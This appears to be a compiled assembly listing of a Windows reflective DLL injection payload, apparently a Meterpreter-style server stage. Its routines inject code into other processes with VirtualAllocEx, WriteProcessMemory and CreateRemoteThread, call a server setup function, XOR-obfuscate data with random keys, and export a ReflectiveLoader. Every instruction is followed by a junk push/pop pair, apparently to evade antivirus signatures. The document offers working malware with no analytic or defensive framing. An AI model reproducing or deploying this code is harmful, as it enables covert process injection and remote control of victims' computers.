	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L101
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	jne	L102
push %eax
pop %eax
L101:
	movl	$0, %eax
push %eax
pop %eax
	jmp	L106
push %eax
pop %eax
L102:
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_GetReflectiveLoaderOffset
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L104
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	leal	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	$64, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualProtect@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L104
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	je	L105
push %eax
pop %eax
	leal	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$6, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L105
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
L105:
	movl	-28(%ebp), %eax
push %eax
pop %eax
	leal	-32(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualProtect@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
L104:
	movl	-24(%ebp), %eax
push %eax
pop %eax
L106:
	leave
push %eax
pop %eax
	ret	$12
push %eax
pop %eax
	.globl	_LoadRemoteLibraryR@20
	.def	_LoadRemoteLibraryR@20;	.scl	2;	.type	32;	.endef
_LoadRemoteLibraryR@20:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$72, %esp
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L114
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L114
push %eax
pop %eax
	cmpl	$0, 16(%ebp)
push %eax
pop %eax
	je	L114
push %eax
pop %eax
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_GetReflectiveLoaderOffset
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	cmpl	$0, -24(%ebp)
push %eax
pop %eax
	je	L115
push %eax
pop %eax
	movl	$4, 16(%esp)
push %eax
pop %eax
	movl	$12288, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAllocEx@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	je	L116
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L117
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$32, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualProtectEx@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L118
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	leal	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 24(%esp)
push %eax
pop %eax
	movl	$0, 20(%esp)
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	$1048576, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CreateRemoteThread@28, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$28, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L114
push %eax
pop %eax
L115:
	nop
push %eax
pop %eax
	jmp	L114
push %eax
pop %eax
L116:
	nop
push %eax
pop %eax
	jmp	L114
push %eax
pop %eax
L117:
	nop
push %eax
pop %eax
	jmp	L114
push %eax
pop %eax
L118:
	nop
push %eax
pop %eax
L114:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret	$20
push %eax
pop %eax
	.globl	_Init
	.def	_Init;	.scl	2;	.type	32;	.endef
_Init:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	_hAppInstance, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L120
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__GetModuleHandleA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, _hAppInstance
push %eax
pop %eax
L120:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_server_setup
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	cmpl	$-365818114, %eax
push %eax
pop %eax
	je	L121
push %eax
pop %eax
	cmpl	$-365818114, %eax
push %eax
pop %eax
	ja	L127
push %eax
pop %eax
	cmpl	$170532320, %eax
push %eax
pop %eax
	je	L123
push %eax
pop %eax
	cmpl	$1453503984, %eax
push %eax
pop %eax
	je	L124
push %eax
pop %eax
	jmp	L127
push %eax
pop %eax
L121:
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__SetUnhandledExceptionFilter@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L125
push %eax
pop %eax
L123:
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__ExitThread@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
L124:
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__ExitProcess@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
L127:
	nop
push %eax
pop %eax
L125:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_DllMain@12
	.def	_DllMain@12;	.scl	2;	.type	32;	.endef
_DllMain@12:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	$1, -12(%ebp)
push %eax
pop %eax
	cmpl	$6, 12(%ebp)
push %eax
pop %eax
	ja	L129
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	$L131, %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	jmp	*%eax
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
L131:
	.long	L129
	.long	L134
	.long	L129
	.long	L129
	.long	L132
	.long	L129
	.long	L130
	.text
L132:
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Init
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L129
push %eax
pop %eax
L130:
	cmpl	$0, 16(%ebp)
push %eax
pop %eax
	je	L137
push %eax
pop %eax
	movl	_hAppInstance, %edx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	jmp	L137
push %eax
pop %eax
L134:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, _hAppInstance
push %eax
pop %eax
	jmp	L129
push %eax
pop %eax
L137:
	nop
push %eax
pop %eax
L129:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret	$12
push %eax
pop %eax
	.def	___udivdi3;	.scl	2;	.type	32;	.endef
	.globl	_current_unix_timestamp
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
_current_unix_timestamp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	leal	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetSystemTime@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	leal	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	leal	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SystemTimeToFileTime@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	-36(%ebp), %edx
push %eax
pop %eax
	addl	$717324288, %eax
push %eax
pop %eax
	adcl	$-27111903, %edx
push %eax
pop %eax
	movl	$10000000, 8(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	call	___udivdi3
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_sleep
	.def	_sleep;	.scl	2;	.type	32;	.endef
_sleep:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	jmp	L141
push %eax
pop %eax
L142:
	movl	$-296, (%esp)
push %eax
pop %eax
	movl	__imp__Sleep@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	subl	$4294967, 8(%ebp)
push %eax
pop %eax
L141:
	cmpl	$4294967, 8(%ebp)
push %eax
pop %eax
	ja	L142
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	imull	$1000, %eax, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__Sleep@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_xor_bytes
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
_xor_bytes:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	$0, -8(%ebp)
push %eax
pop %eax
	jmp	L144
push %eax
pop %eax
L145:
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movzbl	(%eax), %ebx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	andl	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movzbl	(%eax), %ecx
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	xorl	%ecx, %ebx
push %eax
pop %eax
	movl	%ebx, %edx
push %eax
pop %eax
	movb	%dl, (%eax)
push %eax
pop %eax
	addl	$1, -8(%ebp)
push %eax
pop %eax
L144:
	movl	-8(%ebp), %eax
push %eax
pop %eax
	cmpl	16(%ebp), %eax
push %eax
pop %eax
	jb	L145
push %eax
pop %eax
	nop
push %eax
pop %eax
	nop
push %eax
pop %eax
	addl	$16, %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_rand_xor_key
	.def	_rand_xor_key;	.scl	2;	.type	32;	.endef
_rand_xor_key:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	_initialised.83404, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L147
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_time
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_srand
push %eax
pop %eax
	movl	$1, _initialised.83404
push %eax
pop %eax
L147:
	call	_rand
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	$-2130574327, %edx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	imull	%edx
push %eax
pop %eax
	leal	(%edx,%ecx), %eax
push %eax
pop %eax
	sarl	$7, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	sarl	$31, %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	imull	$254, %eax, %eax
push %eax
pop %eax
	subl	%eax, %ecx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	leal	1(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movb	%dl, (%eax)
push %eax
pop %eax
	call	_rand
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	$-2130574327, %edx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	imull	%edx
push %eax
pop %eax
	leal	(%edx,%ecx), %eax
push %eax
pop %eax
	sarl	$7, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	sarl	$31, %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	imull	$254, %eax, %eax
push %eax
pop %eax
	subl	%eax, %ecx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	addl	$1, %edx
push %eax
pop %eax
	movb	%dl, (%eax)
push %eax
pop %eax
	call	_rand
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	$-2130574327, %edx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	imull	%edx
push %eax
pop %eax
	leal	(%edx,%ecx), %eax
push %eax
pop %eax
	sarl	$7, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	sarl	$31, %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	imull	$254, %eax, %eax
push %eax
pop %eax
	subl	%eax, %ecx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	addl	$1, %edx
push %eax
pop %eax
	movb	%dl, (%eax)
push %eax
pop %eax
	call	_rand
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	$-2130574327, %edx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	imull	%edx
push %eax
pop %eax
	leal	(%edx,%ecx), %eax
push %eax
pop %eax
	sarl	$7, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	sarl	$31, %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	imull	$254, %eax, %eax
push %eax
pop %eax
	subl	%eax, %ecx
push %eax
pop %eax
	movl	%ecx, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$3, %eax
push %eax
pop %eax
	addl	$1, %edx
push %eax
pop %eax
	movb	%dl, (%eax)
push %eax
pop %eax
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
LC0:
	.ascii "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
	.text
	.globl	_is_null_guid
	.def	_is_null_guid;	.scl	2;	.type	32;	.endef
_is_null_guid:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	$16, 8(%esp)
push %eax
pop %eax
	movl	$LC0, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memcmp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	sete	%al
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
.lcomm _initialised.83404,4,4
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strcmp;	.scl	2;	.type	32;	.endef
	.def	_strstr;	.scl	2;	.type	32;	.endef
	.def	_server_setup;	.scl	2;	.type	32;	.endef
	.def	_srand;	.scl	2;	.type	32;	.endef
	.def	_rand;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.section .drectve
	.ascii " -export:\"ReflectiveLoader@0\""
